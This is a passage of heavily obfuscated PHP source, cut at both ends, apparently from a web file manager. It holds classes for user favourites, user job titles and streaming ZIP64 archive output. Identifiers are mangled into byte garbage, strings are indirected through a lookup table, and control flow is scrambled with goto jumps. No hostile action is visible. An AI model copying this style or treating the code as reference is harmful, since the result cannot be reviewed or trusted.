$E¯²—®ä¥› && $E¯²—®ä¥›[$AùœÓ‘Í„¹[364]] != $e¼ÅÈ„Åí[$AùœÓ‘Í„¹[364]]) { return !1; } return parent::update($EÄôè½Ù‰®, $Bİ†î¢ÖôÌ); } public function remove($EÂŒ­ Ì°ê, $cèÔ°©ñªñ = false) { $d‡é«Â =& $_SERVER[¼]; $b¸§Å£Ò“• = $this->listData($EÂŒ­ Ì°ê); if (!$b¸§Å£Ò“•) { return; } if (!$cèÔ°©ñªñ && $b¸§Å£Ò“•[$d‡é«Â[1073]] == $d‡é«Â[83]) { return !1; } return parent::remove($EÂŒ­ Ì°ê); } public function enable($eê±ŠºôÛĞ, $DÅ¬é™‘ïµ) { return $this->update($eê±ŠºôÛĞ, array($_SERVER[¼][2427] => $DÅ¬é™‘ïµ)); } public function run($Fˆ“¡Â¿•ƒ) { return $this->update($Fˆ“¡Â¿•ƒ, array($_SERVER[¼][2437] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\x75\163\145\x72\137\x66\141\x76"; protected function cacheFunctionAlias($d§§ì„ƒï) { $f†×âß–Àí =& $_SERVER[¼]; return array($f†×âß–Àí[2438] => array(USER_ID, $f†×âß–Àí[2439])); } protected function listData() { $Bå¨ÙÙõùÅ =& $_SERVER[¼]; $fÈ›ÄØå‘® = array($Bå¨ÙÙõùÅ[1395] => USER_ID, $Bå¨ÙÙõùÅ[432] => 0); $DÅ¾”»œ¶Š = $Bå¨ÙÙõùÅ[2440]; $c²¾–‡ÊŸœ = $this->field($DÅ¾”»œ¶Š)->where($fÈ›ÄØå‘®)->order($Bå¨ÙÙõùÅ[2441])->select(); return $c²¾–‡ÊŸœ ? $c²¾–‡ÊŸœ : array(); } protected function resetCache() { } protected function listView() { goto dØ‹Ó»¶È±; dØ‹Ó»¶È±: $a„åÓ™™®Ò =& $_SERVER[¼]; $AŞ´·äŸ„‹ = $this->listData(); $BòëÒÅÆÔÔ = array_filter_by_field($AŞ´·äŸ„‹, $a„åÓ™™®Ò[29], $a„åÓ™™®Ò[379]); goto a”äùôœŒƒ; cÏ¼‡¾Ã×: $f¢õŒ‘Ÿ°ï = array_to_keyvalue($f¢õŒ‘Ÿ°ï, $a„åÓ™™®Ò[366]); foreach ($AŞ´·äŸ„‹ as $c¿É¿ÌšÌŞ => $cÏÁ­‡§Ëƒ) { $Bõ¦óïƒ‡‰ = $f¢õŒ‘Ÿ°ï[$cÏÁ­‡§Ëƒ[$a„åÓ™™®Ò[75]]]; $Bõ¦óïƒ‡‰ = $Bõ¦óïƒ‡‰ ? $Bõ¦óïƒ‡‰ : array(); $AŞ´·äŸ„‹[$c¿É¿ÌšÌŞ] = array_merge($Bõ¦óïƒ‡‰, $cÏÁ­‡§Ëƒ); } return $AŞ´·äŸ„‹; goto F½ÀÍ—Âœ; a¥¾âÙÕ’“: $Cåˆ»Œ³ò = array($a„åÓ™™®Ò[380] => array($a„åÓ™™®Ò[381], $eæ¼å¿ù‚)); $f¢õŒ‘Ÿ°ï = Model($a„åÓ™™®Ò[744])->listSource($Cåˆ»Œ³ò, $a‡¿â—¹à); $f¢õŒ‘Ÿ°ï = array_merge($f¢õŒ‘Ÿ°ï[$a„åÓ™™®Ò[73]], $f¢õŒ‘Ÿ°ï[$a„åÓ™™®Ò[74]]); goto cÏ¼‡¾Ã×; a”äùôœŒƒ: $eæ¼å¿ù‚ = array_to_keyvalue($BòëÒÅÆÔÔ, $a„åÓ™™®Ò[33], $a„åÓ™™®Ò[75]); if (!$eæ¼å¿ù‚) { return $AŞ´·äŸ„‹; } $a‡¿â—¹à = 2000; goto a¥¾âÙÕ’“; F½ÀÍ—Âœ: } protected function addFav($EÂÃ¿ÓÇ, $c¾Ï¬³½ò = '', $c¶¢¹Òö¹… = "\x73\157\x75\162\x63\x65") { goto eÂÜ‚ÏÁõÄ; d¼×Š¥¥ù˜: if (!$c¾Ï¬³½ò && $c¶¢¹Òö¹… == $BÆ¹„Üù”[379]) { $b—”í©ÖÎò = Model($BÆ¹„Üù”[1103])->where(array($BÆ¹„Üù”[380] => $EÂÃ¿ÓÇ))->find(); if (!$b—”í©ÖÎò) { return !1; } $c¾Ï¬³½ò = $b—”í©ÖÎò[$BÆ¹„Üù”[28]]; } $c¾Ï¬³½ò = $this->getAutoName($c¾Ï¬³½ò); $bÌ’ßÁ² = array($BÆ¹„Üù”[1395] => USER_ID, $BÆ¹„Üù”[432] => 0, $BÆ¹„Üù”[383] => $c¾Ï¬³½ò, $BÆ¹„Üù”[384] => $EÂÃ¿ÓÇ, $BÆ¹„Üù”[385] => $c¶¢¹Òö¹…, $BÆ¹„Üù”[2071] => $C¿ƒé’½´ + 1); goto Aî»Ğ…È×Ï; aÎŒ­ãä“: $c³˜Ç§Ãì„ = array($BÆ¹„Üù”[1395] => USER_ID, $BÆ¹„Üù”[432] => 0); $C¿ƒé’½´ = $this->where($c³˜Ç§Ãì„)->max($BÆ¹„Üù”[2088]); if (!$C¿ƒé’½´) { $C¿ƒé’½´ = 0; } goto d¼×Š¥¥ù˜; eÂÜ‚ÏÁõÄ: $BÆ¹„Üù” =& $_SERVER[¼]; $c³˜Ç§Ãì„ = array($BÆ¹„Üù”[1395] => USER_ID, $BÆ¹„Üù”[432] => 0, $BÆ¹„Üù”[385] => $c¶¢¹Òö¹…, $BÆ¹„Üù”[384] => $EÂÃ¿ÓÇ); if ($this->where($c³˜Ç§Ãì„)->find()) { return !1; } goto aÎŒ­ãä“; Aî»Ğ…È×Ï: return $this->add($bÌ’ßÁ²); goto B©‚©ò­‘÷; B©‚©ò­‘÷: } protected function remove($d—…Ïéİµ«) { $dƒçßÛ·ñè =& $_SERVER[¼]; $E¤Ë©Üì¥² = array($dƒçßÛ·ñè[1395] => USER_ID, $dƒçßÛ·ñè[382] => $d—…Ïéİµ«); return $this->where($E¤Ë©Üì¥²)->delete(); } protected function removeByName($dÅö¹“Å‘å) { $bÍƒóäƒ÷Ø =& $_SERVER[¼]; $BÆ¨¨ê£õµ = array($bÍƒóäƒ÷Ø[1395] => USER_ID, $bÍƒóäƒ÷Ø[383] => $dÅö¹“Å‘å, $bÍƒóäƒ÷Ø[432] => 0); return $this->where($BÆ¨¨ê£õµ)->delete(); } protected function rename($fƒ¢œèğ¦å, $a­ğÒ¨Ã¬) { $díò§©Ñµ‡ =& $_SERVER[¼]; if ($fƒ¢œèğ¦å == $a­ğÒ¨Ã¬) { return !1; } $cè™Ë‹î˜’ = $this->getAutoName($a­ğÒ¨Ã¬); if ($a­ğÒ¨Ã¬ != $cè™Ë‹î˜’) { return !1; } $CèíÔ¦‡× = array($díò§©Ñµ‡[1395] => USER_ID, $díò§©Ñµ‡[432] => 0, $díò§©Ñµ‡[28] => $fƒ¢œèğ¦å); return $this->where($CèíÔ¦‡×)->save(array($díò§©Ñµ‡[28] => $a­ğÒ¨Ã¬)); } protected function resetSort($B›…ìëÃå–) { $cùÒßØæç =& $_SERVER[¼]; $B›…ìëÃå– = is_array($B›…ìëÃå–) ? $B›…ìëÃå– : array(); $føÌË«²¸é = array($cùÒßØæç[1395] => USER_ID); for ($eÏêª‡‡Å = 0; $eÏêª‡‡Å < count($B›…ìëÃå–); $eÏêª‡‡Å++) { $føÌË«²¸é[$cùÒßØæç[382]] = $B›…ìëÃå–[$eÏêª‡‡Å]; $this->where($føÌË«²¸é)->save(array($cùÒßØæç[2071] => $eÏêª‡‡Å + 1)); } return !0; } protected function moveTop($Bˆ¬¼Ğ“Ó) { goto F¶‹Òòêáº; B¨â–‹÷Ó†: $dÕö‰½Ü“´ = $B¨ÁšÎÛ; $B¨ÁšÎÛ = array_remove_value($B¨ÁšÎÛ, $f¿–Ó ìã[$C©ß²Åô‘[364]]); array_unshift($B¨ÁšÎÛ, $f¿–Ó ìã[$C©ß²Åô‘[364]]); goto Fö×éÁëÆÇ; a¨äºÓŸ·: if (!$f¿–Ó ìã) { return; } $B¨ÁšÎÛ = $this->field($C©ß²Åô‘[364])->where($a¯¢¾Öœ)->order($C©ß²Åô‘[2441])->select(); $B¨ÁšÎÛ = array_to_keyvalue($B¨ÁšÎÛ, $C©ß²Åô‘[33], $C©ß²Åô‘[364]); goto B¨â–‹÷Ó†; Fö×éÁëÆÇ: return $this->resetSort($B¨ÁšÎÛ); goto DÎÅÜŠëì±; F¶‹Òòêáº: $C©ß²Åô‘ =& $_SERVER[¼]; $a¯¢¾Öœ = array($C©ß²Åô‘[1395] => USER_ID, $C©ß²Åô‘[432] => 0); $f¿–Ó ìã = $this->where($a¯¢¾Öœ)->where(array($C©ß²Åô‘[28] => $Bˆ¬¼Ğ“Ó))->find(); goto a¨äºÓŸ·; DÎÅÜŠëì±: } protected function moveBottom($BßÛÜÅÛ•) { $F¬À¬µËË¿ =& $_SERVER[¼]; $EøÚ÷äì…é = array($F¬À¬µËË¿[1395] => USER_ID, $F¬À¬µËË¿[432] => 0); $D³…¤µ½ÎÚ = $this->where($EøÚ÷äì…é)->max($F¬À¬µËË¿[2088]); $eó¨Œ±¼¾Œ = array($F¬À¬µËË¿[2088] => $D³…¤µ½ÎÚ + 1); return $this->where($EøÚ÷äì…é)->where(array($F¬À¬µËË¿[28] => $BßÛÜÅÛ•))->save($eó¨Œ±¼¾Œ); } private function getAutoName($eæ‰¬§Ìğ) { goto EšÑÜƒèŸ; fğ¦Éê‰ «: $F“ø…´Ğœ” = array_to_keyvalue($F“ø…´Ğœ”, $fç‹Í ¦õÏ[33], $fç‹Í ¦õÏ[28]); if (!$F“ø…´Ğœ” || !in_array($eæ‰¬§Ìğ, $F“ø…´Ğœ”)) { return $eæ‰¬§Ìğ; } for ($b­áğ£åÈ— = 0; $b­áğ£åÈ— < count($F“ø…´Ğœ”); $b­áğ£åÈ—++) { if (!in_array($eæ‰¬§Ìğ . "\x28{$b­áğ£åÈ—}\51", $F“ø…´Ğœ”)) { return $eæ‰¬§Ìğ . "\50{$b­áğ£åÈ—}\51"; } } goto F‹ğâù“„¿; F‹ğâù“„¿: return $eæ‰¬§Ìğ . "\50{$b­áğ£åÈ—}\x29"; goto Eõ¡ø‰ò¸; EšÑÜƒèŸ: $fç‹Í ¦õÏ =& $_SERVER[¼]; $AóÓ÷ºÉ¥ = array($fç‹Í ¦õÏ[1395] => USER_ID, $fç‹Í ¦õÏ[432] => 0); $F“ø…´Ğœ” = $this->field($fç‹Í ¦õÏ[28])->where($AóÓ÷ºÉ¥)->select(); goto fğ¦Éê‰ «; Eõ¡ø‰ò¸: } } class UserJobModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\x65\x6d\x2e\x6a\157\x62\114\x69\163\x74"; public $field = array("\156\x61\x6d\145", "\x64\x65\163\x63", "\163\x6f\162\x74"); const JOB_KEY = "\x73\145\x6c\x66\x4a\157\x62\114\151\163\164"; public function listData($cÚÜÛÖî‘¡ = false, $eÚ‚Ş„‘«‰ = "\163\157\162\164", $eùÛÔ®¥¤Ø = false) { return parent::listData($cÚÜÛÖî‘¡, $eÚ‚Ş„‘«‰, $eùÛÔ®¥¤Ø); } public function remove($f¡Ûè©Ü×é) { return parent::remove($f¡Ûè©Ü×é); } public function add($d¼“Ö¸Âê) { $e¸»…•¯÷ =& $_SERVER[¼]; if ($this->findByName($d¼“Ö¸Âê[$e¸»…•¯÷[28]])) { return !1; } $d¼“Ö¸Âê[$e¸»…•¯÷[2088]] = $this->getSort(); return parent::insert($d¼“Ö¸Âê); } private function getSort() { $FªŒ¦çª®Æ =& $_SERVER[¼]; $A©¦Ÿ¨²ì = parent::listData(); $d¯‘“ˆÉô… = array_to_keyvalue($A©¦Ÿ¨²ì, $FªŒ¦çª®Æ[33], $FªŒ¦çª®Æ[2088]); return empty($d¯‘“ˆÉô…) ? 0 : max($d¯‘“ˆÉô…) + 1; } public function update($D‰¤‹Øô±¯, $aÚ¤²”†Ÿ) { $d÷‚×ÉÃù„ =& $_SERVER[¼]; $aÍ†¨ãì = parent::listData($D‰¤‹Øô±¯); $FŠ†˜âÏ­ù = $this->findByName($aÚ¤²”†Ÿ[$d÷‚×ÉÃù„[28]]); if (!$aÍ†¨ãì || $FŠ†˜âÏ­ù && $FŠ†˜âÏ­ù[$d÷‚×ÉÃù„[364]] != $aÍ†¨ãì[$d÷‚×ÉÃù„[364]]) { return !1; } return parent::update($D‰¤‹Øô±¯, $aÚ¤²”†Ÿ); } public function setUserJob($AÃİš«±í‚, $bï„õó­¸ê) { goto Cİ²á«à¶ã; bš‡½¤Î‡: $bµÎ·İ±²Ã = rtrim($bµÎ·İ±²Ã, $c¸ìË„†“[47]); Model($c¸ìË„†“[473])->metaSet($AÃİš«±í‚, self::JOB_KEY, $bµÎ·İ±²Ã); goto AÃö²æÄÓ»; Cİ²á«à¶ã: $c¸ìË„†“ =& $_SERVER[¼]; if (!is_array($bï„õó­¸ê)) { $bï„õó­¸ê = array($bï„õó­¸ê); } $dÓØ½Ÿğß = parent::listData(); goto AÔ¤ëëÏ«Ã; AÔ¤ëëÏ«Ã: $fÑİ¢ôõ¦Ô = array_to_keyvalue($dÓØ½Ÿğß, $c¸ìË„†“[28]); $bµÎ·İ±²Ã = $c¸ìË„†“[358]; foreach ($bï„õó­¸ê as $b·šÔ£ÅÀ½) { if ($fÑİ¢ôõ¦Ô[$b·šÔ£ÅÀ½]) { $bµÎ·İ±²Ã .= $fÑİ¢ôõ¦Ô[$b·šÔ£ÅÀ½][$c¸ìË„†“[364]] . $c¸ìË„†“[47]; } else { $fğ„ÈßÌÕœ = $this->add($b·šÔ£ÅÀ½); $bµÎ·İ±²Ã .= $fğ„ÈßÌÕœ . $c¸ìË„†“[47]; } } goto bš‡½¤Î‡; AÃö²æÄÓ»: } public function getUserJob($cåŞî¶Ø…×) { $a×ø—†©‚Â = Model($_SERVER[¼][473])->metaGet($cåŞî¶Ø…×); return $this->getUserJobInfo($a×ø—†©‚Â[self::JOB_KEY]); } public function getUserJobInfo($BÇÎö°È×™) { goto A‡ÓºİÛáœ; A‡ÓºİÛáœ: $C®‚‘„ğ­” =& $_SERVER[¼]; $cŒ•’ğ­Ù— = explode($C®‚‘„ğ­”[47], $BÇÎö°È×™); $Eí²Öáæ¦ = parent::listData(); goto c”„ Ì; c”„ Ì: $Eí²Öáæ¦ = array_remove_key($Eí²Öáæ¦, $C®‚‘„ğ­”[184]); $C£¡»õÅİÁ = array(); foreach ($cŒ•’ğ­Ù— as $cÇØÈ’£î) { if (isset($Eí²Öáæ¦[$cÇØÈ’£î])) { $C£¡»õÅİÁ[] = $Eí²Öáæ¦[$cÇØÈ’£î]; } } goto A¦¡Æº®¦²; A¦¡Æº®¦²: return $C£¡»õÅİÁ; goto B…çèàÃÆ…; B…çèàÃÆ…: } } goto e‹òœóã¦¸; cé…İê®¥Ÿ: class ZipMake { const VERSION = "\x30\56\62\56\x30"; const ZIP_VERSION = 10; const ZIP_VERSION_64 = 45; const METHOD_STORE = 0; const FILE_HEADER_SIGNATURE = 67324752; const CDR_FILE_SIGNATURE = 33639248; const CDR_EOF_SIGNATURE = 101010256; const DATA_DESCRIPTOR_SIGNATURE = 134695760; const ZIP64_CDR_EOF_SIGNATURE = 101075792; const ZIP64_CDR_LOCATOR_SIGNATURE = 117853008; public $files = array(); public $cdrOffset = 0; public $ofs = 0; protected $needHeaders; protected $outputName; public function __construct($c ø‡ßĞğÏ = null) { $aôè©Ş¾¥… =& $_SERVER[¼]; $this->outputStream = fopen($aôè©Ş¾¥…[1972], $aôè©Ş¾¥…[1211]); $this->outputName = $c ø‡ßĞğÏ; $this->needHeaders = !0; } public function addFile($CºÒÊËƒ¿ê, $cÍÌ‡¡•ò) { goto Dí½ø§´İë; bã –£Û‹‰: $FåãÚ‚ˆË = $this->addFileHeader($CºÒÊËƒ¿ê, $fºàßÑ¨Áø); $Bİ’÷Şî² = $f•å“ßÎ¸ = filesize($cÍÌ‡¡•ò); $f¾Ÿ‡ƒÚ©Ğ = fopen($cÍÌ‡¡•ò, $cŞîË¥Ùàƒ[1973]); goto cáçµé¨; Dí½ø§´İë: $cŞîË¥Ùàƒ =& $_SERVER[¼]; $CºÒÊËƒ¿ê = $this->filterFilename($CºÒÊËƒ¿ê); $fºàßÑ¨Áø = static::METHOD_STORE; goto bã –£Û‹‰; c•§Ò—»Š: $this->addFileFooter($CºÒÊËƒ¿ê, $fºàßÑ¨Áø, $c“¸ÖöÅ”, $Bİ’÷Şî², $f•å“ßÎ¸, $FåãÚ‚ˆË); goto EÚ¼»Æ¹µá; cáçµé¨: while (!feof($f¾Ÿ‡ƒÚ©Ğ)) { $AÉôÇî = fread($f¾Ÿ‡ƒÚ©Ğ, 1048576); $this->send($AÉôÇî); } fclose($f¾Ÿ‡ƒÚ©Ğ); $c“¸ÖöÅ” = hexdec(hash_file($cŞîË¥Ùàƒ[1974], $cÍÌ‡¡•ò)); goto c•§Ò—»Š; EÚ¼»Æ¹µá: } public function addFileFromStream($b‘”ŒŒ²è», $E™ËÅÌá›ñ) { goto CÚ ¸ÃŸÔÎ; Bê’ôè×­­: fseek($E™ËÅÌá›ñ, 0, SEEK_END); $fäØ¥ÁÈ ÷ = $AÖ¿²¦ñóŞ = ftell($E™ËÅÌá›ñ); rewind($E™ËÅÌá›ñ); goto eˆŠîæ™˜Ä; CÚ ¸ÃŸÔÎ: $b‘”ŒŒ²è» = $this->filterFilename($b‘”ŒŒ²è»); $D¹Š¦´×Ö¯ = static::METHOD_STORE; $aôÃÕ„âÉ‡ = $this->addFileHeader($b‘”ŒŒ²è», $D¹Š¦´×Ö¯); goto Bê’ôè×­­; b¾ğ¼Ê“Ú: $this->addFileFooter($b‘”ŒŒ²è», $D¹Š¦´×Ö¯, $fš©éä¼‚£, $fäØ¥ÁÈ ÷, $AÖ¿²¦ñóŞ, $aôÃÕ„âÉ‡); goto aÏ½¶Ä¼ô¹; eˆŠîæ™˜Ä: $f·Ğ¯ªäª = hash_init($_SERVER[¼][1974]); while (!feof($E™ËÅÌá›ñ)) { $B„Ø›ê¡­ø = fread($E™ËÅÌá›ñ, 1048576); hash_update($f·Ğ¯ªäª, $B„Ø›ê¡­ø); $this->send($B„Ø›ê¡­ø); } $fš©éä¼‚£ = hexdec(hash_final($f·Ğ¯ªäª)); goto b¾ğ¼Ê“Ú; aÏ½¶Ä¼ô¹: } public function finish() { foreach ($this->files as $cî÷ØÅÊí) { $this->addCdrFile($cî÷ØÅÊí); } $this->addCdr64Eof(); $this->addCdr64Locator(); $this->addCdrEof(); $this->clear(); } protected function addFileHeader($c¥»™ŒÕ°•, $aë£ÆİÍ¼) { goto CòíïÑæøË; eÊ— Ó£ñ±: $cº™ïçİâ­ = $this->dosTime(time()); $C±¿ìÈ™µ = array(array($c‘¦ÛŒ‡‰Û[1976], static::FILE_HEADER_SIGNATURE), array($c‘¦ÛŒ‡‰Û[1977], static::ZIP_VERSION_64), array($c‘¦ÛŒ‡‰Û[1977], 8), array($c‘¦ÛŒ‡‰Û[1977], $aë£ÆİÍ¼), array($c‘¦ÛŒ‡‰Û[1976], $cº™ïçİâ­), array($c‘¦ÛŒ‡‰Û[1976], 0), array($c‘¦ÛŒ‡‰Û[1976], 4294967295), array($c‘¦ÛŒ‡‰Û[1976], 4294967295), array($c‘¦ÛŒ‡‰Û[1977], $eÜå…ˆ·„), array($c‘¦ÛŒ‡‰Û[1977], 32)); $bÓİ‚ËäæÈ = array(array($c‘¦ÛŒ‡‰Û[1977], 1), array($c‘¦ÛŒ‡‰Û[1977], 28), array($c‘¦ÛŒ‡‰Û[1978], 0), array($c‘¦ÛŒ‡‰Û[1978], 0), array($c‘¦ÛŒ‡‰Û[1978], 0), array($c‘¦ÛŒ‡‰Û[1976], 0)); goto e©¦§¾Ø„Ñ; CòíïÑæøË: $c‘¦ÛŒ‡‰Û =& $_SERVER[¼]; $c¥»™ŒÕ°• = preg_replace($c‘¦ÛŒ‡‰Û[1975], $c‘¦ÛŒ‡‰Û[33], $c¥»™ŒÕ°•); $eÜå…ˆ·„ = strlen($c¥»™ŒÕ°•); goto eÊ— Ó£ñ±; e©¦§¾Ø„Ñ: $FœƒÜˆø¬Š = $this->packFields($C±¿ìÈ™µ); $dÌ¶ˆÏœ¤¥ = $this->packFields($bÓİ‚ËäæÈ); $this->send($FœƒÜˆø¬Š . $c¥»™ŒÕ°• . $dÌ¶ˆÏœ¤¥); goto e«ïÃ‘“çÊ; e«ïÃ‘“çÊ: return strlen($FœƒÜˆø¬Š) + $eÜå…ˆ·„ + strlen($dÌ¶ˆÏœ¤¥); goto EñÍ‰¾‘ÖÃ; EñÍ‰¾‘ÖÃ: } protected function addFileFooter($eëÎ¬»˜º, $fÉã„ä®”, $eªŞÂ¥Ê, $CÇê‹§›²¡, $A™Ÿâ…ç², $eêí»¶Ÿ‘¢) { $C¬í‡öæ×š =& $_SERVER[¼]; $FóƒÂ•ÏÀ = array(array($C¬í‡öæ×š[1976], static::DATA_DESCRIPTOR_SIGNATURE), array($C¬í‡öæ×š[1976], $eªŞÂ¥Ê), array($C¬í‡öæ×š[1978], $CÇê‹§›²¡), array($C¬í‡öæ×š[1978], $A™Ÿâ…ç²)); $f©Š¿Å°İ‹ = $this->packFields($FóƒÂ•ÏÀ); $this->send($f©Š¿Å°İ‹); $bîøø‰Ìí… = $eêí»¶Ÿ‘¢ + $CÇê‹§›²¡ + $bîç¶Çò•Í; $this->addToCdr($eëÎ¬»˜º, $fÉã„ä®”, $eªŞÂ¥Ê, $CÇê‹§›²¡, $A™Ÿâ…ç², $bîøø‰Ìí…); } private function addToCdr($aÔŸšÅÊÑ, $D‹¡ÆÎ±Îá, $fƒğäºïíÙ, $a¸˜ªóäˆ, $C°±×°ß„å, $eˆƒ½óìºà) { $this->files[] = array($aÔŸšÅÊÑ, $D‹¡ÆÎ±Îá, $fƒğäºïíÙ, $a¸˜ªóäˆ, $C°±×°ß„å, $this->ofs); $this->ofs += $eˆƒ½óìºà; } protected function addCdrFile($féØæë¦ö) { goto E§ùŒĞÃ‹; C«âãÇŠŒ: $C¹ì…±ã– = $this->dosTime(time()); $A”¦Ü³¥†ñ = array(array($fÎ¦–êºÓØ[1976], static::CDR_FILE_SIGNATURE), array($fÎ¦–êºÓØ[1977], static::ZIP_VERSION_64), array($fÎ¦–êºÓØ[1977], static::ZIP_VERSION_64), array($fÎ¦–êºÓØ[1977], 8), array($fÎ¦–êºÓØ[1977], $a¹…İ¶½øÇ), array($fÎ¦–êºÓØ[1976], $C¹ì…±ã–), array($fÎ¦–êºÓØ[1976], $eßçºõ¢Ÿœ), array($fÎ¦–êºÓØ[1976], 4294967295), array($fÎ¦–êºÓØ[1976], 4294967295), array($fÎ¦–êºÓØ[1977], strlen($BòÖÃÓ™«)), array($fÎ¦–êºÓØ[1977], 32), array($fÎ¦–êºÓØ[1977], strlen($e†š—¸ğ•)), array($fÎ¦–êºÓØ[1977], 0), array($fÎ¦–êºÓØ[1977], 0), array($fÎ¦–êºÓØ[1976], 32), array($fÎ¦–êºÓØ[1976], 4294967295)); $FŠ„¿‡´ìá = array(array($fÎ¦–êºÓØ[1977], 1), array($fÎ¦–êºÓØ[1977], 28), array($fÎ¦–êºÓØ[1978], $e¼ÂÛ£—ÇÚ), array($fÎ¦–êºÓØ[1978], $Eİ‰­¶©¨»), array($fÎ¦–êºÓØ[1978], $dõÇ„È–Ğ¶), array($fÎ¦–êºÓØ[1976], 0)); goto AŠÑ¯±êç¾; AŠÑ¯±êç¾: $fø¾Ùƒ¢¬ = $this->packFields($A”¦Ü³¥†ñ); $CõŸÑÄ¹¯ã = $this->packFields($FŠ„¿‡´ìá); $DŸ½´›‘¶ = $fø¾Ùƒ¢¬ . $BòÖÃÓ™« . $e†š—¸ğ• . $CõŸÑÄ¹¯ã; goto føç‚òœ©; føç‚òœ©: $this->send($DŸ½´›‘¶); $this->cdr_ofs += strlen($DŸ½´›‘¶); goto F«ƒ‰äøŸÜ; E§ùŒĞÃ‹: $fÎ¦–êºÓØ =& $_SERVER[¼]; list($BòÖÃÓ™«, $a¹…İ¶½øÇ, $eßçºõ¢Ÿœ, $Eİ‰­¶©¨», $e¼ÂÛ£—ÇÚ, $dõÇ„È–Ğ¶) = $féØæë¦ö; $e†š—¸ğ• = $fÎ¦–êºÓØ[33]; goto C«âãÇŠŒ; F«ƒ‰äøŸÜ: } protected function addCdr64Eof() { goto a›…Æ«®—­; bÜÀÈï½ĞË: $this->send($D•Âô«ïŒ·); goto EÂÎ¯²á¾; a›…Æ«®—­: $a„ƒİÖÓĞ =& $_SERVER[¼]; $fã÷¤õÊ‰Ò = count($this->files); $B¿š¶³’ÄĞ = $this->cdr_ofs; goto eõê­¡ìÏ†; eõê­¡ìÏ†: $BàƒÑòµ–³ = $this->ofs; $dÚ§ë‚¥Å = array(array($a„ƒİÖÓĞ[1976], static::ZIP64_CDR_EOF_SIGNATURE), array($a„ƒİÖÓĞ[1978], 44), array($a„ƒİÖÓĞ[1977], static::ZIP_VERSION_64), array($a„ƒİÖÓĞ[1977], static::ZIP_VERSION_64), array($a„ƒİÖÓĞ[1976], 0), array($a„ƒİÖÓĞ[1976], 0), array($a„ƒİÖÓĞ[1978], $fã÷¤õÊ‰Ò), array($a„ƒİÖÓĞ[1978], $fã÷¤õÊ‰Ò), array($a„ƒİÖÓĞ[1978], $B¿š¶³’ÄĞ), array($a„ƒİÖÓĞ[1978], $BàƒÑòµ–³)); $D•Âô«ïŒ· = $this->packFields($dÚ§ë‚¥Å); goto bÜÀÈï½ĞË; EÂÎ¯²á¾: } protected function addCdr64Locator() { goto fß†À‡Ìô‡; B„À¡¬­„‚: $this->send($bÜ‚¯ÇÒ¥í); goto e‘²ª«“æ¿; fß†À‡Ìô‡: $A³ÅŞÓ¶İå =& $_SERVER[¼]; $f²›İÑ‡÷ = count($this->files); $cÛ†Â²¸İ = $this->cdr_ofs; goto Bäè…­ÑØ…; Bäè…­ÑØ…: $Dñ™™ĞÉ’÷ = $this->ofs; $Báî åÓĞÁ = array(array($A³ÅŞÓ¶İå[1976], static::ZIP64_CDR_LOCATOR_SIGNATURE), array($A³ÅŞÓ¶İå[1976], 0), array($A³ÅŞÓ¶İå[1978], $Dñ™™ĞÉ’÷ + $cÛ†Â²¸İ), array($A³ÅŞÓ¶İå[1976], 1)); $bÜ‚¯ÇÒ¥í = $this->packFields($Báî åÓĞÁ); goto B„À¡¬­„‚; e‘²ª«“æ¿: } protected function addCdrEof() { goto eÈã¸¿¢„ù; bôƒ¯ë¡´‹: $cà¸Ÿ¹„›ˆ = $this->ofs; $c©šè‰ÎÆô = $C¡¤—Êˆ˜[33]; $aæÕÇÒÛÍ° = array(array($C¡¤—Êˆ˜[1976], static::CDR_EOF_SIGNATURE), array($C¡¤—Êˆ˜[1977], 0), array($C¡¤—Êˆ˜[1977], 0), array($C¡¤—Êˆ˜[1977], $d†ÑÖÙ¹òÊ), array($C¡¤—Êˆ˜[1977], $d†ÑÖÙ¹òÊ), array($C¡¤—Êˆ˜[1976], 4294967295), array($C¡¤—Êˆ˜[1976], 4294967295), array($C¡¤—Êˆ˜[1977], strlen($c©šè‰ÎÆô))); goto d¥ÉÚ¥Æ˜Õ; eÈã¸¿¢„ù: $C¡¤—Êˆ˜ =& $_SERVER[¼]; $d†ÑÖÙ¹òÊ = count($this->files); $E¦–ÅË­ö = $this->cdr_ofs; goto bôƒ¯ë¡´‹; d¥ÉÚ¥Æ˜Õ: $CÁãğˆ×è‰ = $this->packFields($aæÕÇÒÛÍ°) . $c©šè‰ÎÆô; $this->send($CÁãğˆ×è‰); goto fÍêØñß‘Ï; fÍêØñß‘Ï: } protected function addCdr() { foreach ($this->files as $d«¹¹¹ƒÏƒ) { $this->addCdrFile($d«¹¹¹ƒÏƒ); } $this->addCdrEof(); } protected function clear() { $this->files = array(); $this->ofs = 0; $this->cdr_ofs = 0; } protected function sendHttpHeaders() { $Aø³±‡ĞÃ¦ =& $_SERVER[¼]; $C©Œ¼ÜÙƒ« = $Aø³±‡ĞÃ¦[199]; if ($this->outputName) { $c˜Ï£Ù—šİ = trim(str_replace(array($Aø³±‡ĞÃ¦[113], $Aø³±‡ĞÃ¦[55], $Aø³±‡ĞÃ¦[95], $Aø³±‡ĞÃ¦[67], $Aø³±‡ĞÃ¦[214], $Aø³±‡ĞÃ¦[985]), $Aø³±‡ĞÃ¦[33], $this->outputName)); $D·ØÒ…íË = rawurlencode($c˜Ï£Ù—šİ); $C©Œ¼ÜÙƒ« .= "\x3b\x20\x66\x69\154\145\156\141\x6d\145\x2a\x3d\165\164\x66\x2d\70\x27\x27{$D·ØÒ…íË}"; } $EÍêò±ÌøŒ = array($Aø³±‡ĞÃ¦[196] => $Aø³±‡ĞÃ¦[1979], $Aø³±‡ĞÃ¦[1980] => $C©Œ¼ÜÙƒ«, $Aø³±‡ĞÃ¦[1981] => $Aø³±‡ĞÃ¦[1982], $Aø³±‡ĞÃ¦[1983] => $Aø³±‡ĞÃ¦[1984], $Aø³±‡ĞÃ¦[1985] => $Aø³±‡ĞÃ¦[1986]); foreach ($EÍêò±ÌøŒ as $a÷ËÍ‰Õ‹¾ => $cœš™»¨ºÚ) { header($a÷ËÍ‰Õ‹¾ . $Aø³±‡ĞÃ¦[875] . $cœš™»¨ºÚ); } } protected function send($CÂÜ³êâÑÇ) { if ($this->needHeaders) { $this->sendHttpHeaders(); } $this->needHeaders = !1; fwrite($this->outputStream, $CÂÜ³êâÑÇ); } protected final function dosTime($D¸µªˆ¤äÅ) { $aÒÈ¤ĞòŠŒ =& $_SERVER[¼]; $bÕ´»ñÕãÛ = getdate($D¸µªˆ¤äÅ); if ($bÕ´»ñÕãÛ[$aÒÈ¤ĞòŠŒ[1689]] < 1980) { $bÕ´»ñÕãÛ = 